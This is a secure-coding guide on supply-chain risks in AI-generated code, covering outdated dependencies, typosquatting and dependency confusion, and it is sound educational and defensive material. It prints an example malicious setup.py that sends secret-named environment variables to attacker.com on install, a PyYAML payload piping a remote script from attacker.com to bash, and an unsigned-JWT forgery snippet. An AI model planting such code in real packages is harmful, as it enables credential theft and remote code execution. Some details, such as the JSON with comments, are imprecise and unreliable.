# Insecure Dependencies and Supply Chain Risks in AI-Generated Code

## The Hidden Danger of Outdated Packages

Research from the Center for Security and Emerging Technology identifies supply chain vulnerabilities as **one of three main categories** of AI code generation risks, noting:

> "Models generating code often suggest outdated or vulnerable dependencies, creating a cascading effect of security issues."

## 1.4.1 Using Vulnerable Dependencies

### The Problem

A 2025 analysis by KDnuggets found:

> "AI models frequently suggest packages that haven't been updated in years, with **67% of suggested dependencies containing at least one known vulnerability**."

### Why This Happens

**1. Training Data Lag:**
- AI trained on code from 2020-2023
- Suggests package versions from that era
- Doesn't know about vulnerabilities discovered since

**2. Example Code Bias:**
- Tutorial code uses older, stable versions
- AI learns these as "recommended"
- Perpetuates outdated patterns

**3. No Vulnerability Awareness:**
- AI can't check CVE databases
- Doesn't know which versions are vulnerable
- Can't reason about security patches

### AI-Generated Vulnerable Code

## 1.4.2 Dependency Confusion Attacks

### The Problem

AI frequently generates typos or wrong package names, which can lead to installing malicious packages designed to exploit common mistakes.

### AI-Generated Vulnerable Code

```python
# AI might generate typos or wrong package names
pip install reqeusts     # ❌ TYPO: Could install malicious package
pip install python-sqlite # ❌ WRONG: Should use built-in sqlite3
pip install dateutils    # ❌ WRONG: Should be python-dateutil
pip install crypto       # ❌ WRONG: Should be pycryptodome
pip install yaml         # ❌ WRONG: Should be pyyaml
```

### Real Typosquatting Examples

**Documented malicious packages:**
- `crossenv` (typo of `cross-env`) - Stole environment variables
- `babelcli` (typo of `babel-cli`) - Executed malicious code
- `mongose` (typo of `mongoose`) - Data exfiltration
- `etherium` (typo of `ethereum`) - Cryptocurrency theft
- `python-dateutils` (typo of `python-dateutil`) - Backdoor

**Attack Pattern:**
1. Attacker identifies popular package (e.g., "requests")
2. Registers typo variations (reqeusts, requets, requesets)
3. Malicious package looks similar, includes actual package
4. Adds malicious code (steal env vars, mine crypto, backdoor)
5. Waits for developers to make typo
6. Malicious package installed

### How Typosquatting Works

```python
# Malicious "reqeusts" package (typo of "requests")

# setup.py
from setuptools import setup
import os
import requests as real_requests  # Import real package

# Steal environment variables
def steal_secrets():
    secrets = {k: v for k, v in os.environ.items()
               if any(s in k.lower() for s in ['key', 'secret', 'token', 'password'])}

    # Send to attacker
    real_requests.post('https://attacker.com/collect', json=secrets)

# Run on install
steal_secrets()

# Re-export real package so code "works"
from requests import *

setup(
    name='reqeusts',  # Typo
    # ... rest of setup
)
```

**Result:**
- Developer makes typo: `pip install reqeusts`
- Malicious package installed
- Secrets stolen during installation
- Real package also installed (code works!)
- Developer never notices

### Secure Implementation with Verification

```bash
#!/bin/bash
# secure_install.sh - Verify packages before installation

# ✅ SECURE: Define trusted packages and their correct names
declare -A TRUSTED_PACKAGES=(
    ["requests"]="requests"
    ["python-dateutil"]="python-dateutil"
    ["pycryptodome"]="pycryptodome"
    ["pyyaml"]="PyYAML"
    ["pillow"]="Pillow"
)

# ✅ SECURE: Function to verify package
verify_package() {
    local package=$1

    # Check if package is in trusted list
    if [[ -n "${TRUSTED_PACKAGES[$package]}" ]]; then
        echo "✓ Verified: $package"
        return 0
    fi

    # Check for common typos
    case $package in
        "reqeusts"|"requets"|"requesets")
            echo "✗ Typo detected! Did you mean 'requests'?"
            return 1
            ;;
        "dateutils"|"date-utils")
            echo "✗ Wrong package! Use 'python-dateutil' instead"
            return 1
            ;;
        *)
            echo "⚠ Unknown package: $package - Verify manually"
            return 2
            ;;
    esac
}

# ✅ SECURE: Install with verification
secure_pip_install() {
    for package in "$@"; do
        if verify_package "$package"; then
            pip install "$package" --index-url https://pypi.org/simple/
        else
            echo "Installation aborted for security reasons"
            exit 1
        fi
    done
}

# Example usage
secure_pip_install requests python-dateutil pycryptodome
```

## Why AI Suggests Vulnerable Dependencies

### 1. Training Data Reflects Older Versions

**AI training cutoff:**
- Models trained on code from 2020-2023
- Package versions from that era
- Doesn't know about 2024-2025 updates

**Example:**
- AI trained on code using `lodash@4.17.4` (2016 version)
- Suggests this version in 2025
- Missing **5 years** of security patches
- Contains prototype pollution vulnerability

### 2. Version Pinning in Training Data

**Code examples pin specific versions:**
```json
"express": "4.16.0"  // Pinned in example from 2018
```

**AI learns:**
- Specific versions are "recommended"
- Doesn't use `^` (caret) for latest minor version
- Suggests exact outdated version

### 3. Deprecated Package Suggestions

**AI suggests deprecated packages:**
- `request` (deprecated 2020) → Should use `axios` or `fetch`
- `node-uuid` (deprecated) → Should use `uuid`
- `moment` (in maintenance mode) → Should use `dayjs` or `date-fns`

**Why:**
- Deprecated packages still in millions of repositories
- AI sees high usage, assumes current
- Doesn't check deprecation notices

## Specific Vulnerability Examples

### Express 3.0.0 - 66 Vulnerabilities

**CVE Examples:**
- CVE-2014-6393: Path traversal
- CVE-2015-8851: Open redirect
- Multiple DoS vulnerabilities
- Missing security features (helmet, etc.)

**Impact:**
- Attackers can read arbitrary files
- Redirect users to phishing sites
- Crash server with crafted requests

### jsonwebtoken 5.0.0 - Algorithm Confusion

**Vulnerability:**
- Allows changing algorithm from RS256 to none
- Attacker can forge tokens without signature
- Complete authentication bypass

**Attack:**
```javascript
// Vulnerable version: 5.0.0
const token = jwt.sign({ admin: true }, 'secret', { algorithm: 'none' });
// Server accepts token without verifying signature!
```

**Fix:** Update to 9.0.0+ (algorithm verification enforced)

### PyYAML 3.11 - Arbitrary Code Execution

**Vulnerability (CVE-2017-18342):**
```python
import yaml

# Attacker provides malicious YAML:
malicious_yaml = """
!!python/object/apply:os.system
args: ['curl http://attacker.com/shell.sh | bash']
"""

yaml.load(malicious_yaml)  # Executes command!
```

**Fix:** Use PyYAML 6.0.1+ with safe_load():
```python
yaml.safe_load(data)  # Safe - no code execution
```

## Secure Dependency Management

### Use Latest Stable Versions

```json
{
  "dependencies": {
    "express": "^4.19.0",      // ✅ Caret allows patch/minor updates
    "mongoose": "^8.0.3",      // ✅ Latest major version
    "jsonwebtoken": "^9.0.2"   // ✅ Secure version
  }
}
```

**Semantic Versioning:**
- `^4.19.0` → Allows 4.19.x and 4.x.x (not 5.0.0)
- Automatic security patches
- No breaking changes

### Audit Before Every Deploy

```bash
# Check for vulnerabilities
npm audit --production

# Must show: 0 vulnerabilities
```

### Use Security Scanning Tools

```json
{
  "scripts": {
    "audit": "npm audit --production",
    "audit:fix": "npm audit fix",
    "snyk": "snyk test",
    "preinstall": "npm audit"  // Auto-check before install
  },
  "devDependencies": {
    "snyk": "^1.1266.0",
    "npm-audit-resolver": "^3.0.0"
  }
}
```

### Pin Versions with package-lock.json

```bash
# Always commit package-lock.json
git add package-lock.json
git commit -m "Lock dependency versions"
```

**Why:**
- Ensures exact versions installed
- Prevents dependency confusion
- Reproducible builds
- Detects tampering

## Dependency Confusion Attack Deep Dive

### What It Is

**Scenario:**
1. Your company has internal package: `@mycompany/auth`
2. Attacker publishes public package: `@mycompany/auth` with higher version
3. npm might install attacker's package instead
4. Malicious code runs in your application

### Real Dependency Confusion Attack (2021)

**Alex Birsan's Research:**
- Security researcher tested dependency confusion
- Published benign test packages with corporate namespaces
- Packages were downloaded by:
  - Microsoft
  - Apple
  - PayPal
  - Tesla
  - 30+ other major companies
- Proved attack works at scale

**No companies were harmed** (benign test), but demonstrated massive vulnerability.

### Common Typos AI Makes

**Python:**
```python
pip install reqeusts      # → requests
pip install python-sqlite # → use built-in sqlite3
pip install dateutils     # → python-dateutil
pip install crypto        # → pycryptodome
pip install yaml          # → pyyaml
pip install beutifulsoup4 # → beautifulsoup4
pip install pillow-simd   # → pillow (or pillow-simd if needed)
```

**JavaScript:**
```bash
npm install expres        # → express
npm install reac          # → react
npm install mangodb       # → mongodb
npm install loadsh        # → lodash
npm install moment-timezone # → moment-timezone (legitimate, but check)
```

### Prevention Strategies

**1. Verify Package Names:**
```bash
# Before installing, check npm:
npm view package-name

# Verify:
# - Weekly downloads (popular = more likely legitimate)
# - Last publish date (recently maintained?)
# - Repository (GitHub URL)
# - Maintainers (verified badge?)
```

**2. Use Scoped Packages for Internal:**
```json
{
  "@mycompany/internal-auth": "1.0.0"
}
```

**3. Configure Registry for Scopes:**
```bash
# .npmrc
@mycompany:registry=https://npm.mycompany.com
```

**4. Spell Check Package Names:**
```bash
# Use IDE autocomplete
# Copy-paste from official docs
# Double-check before npm install
```
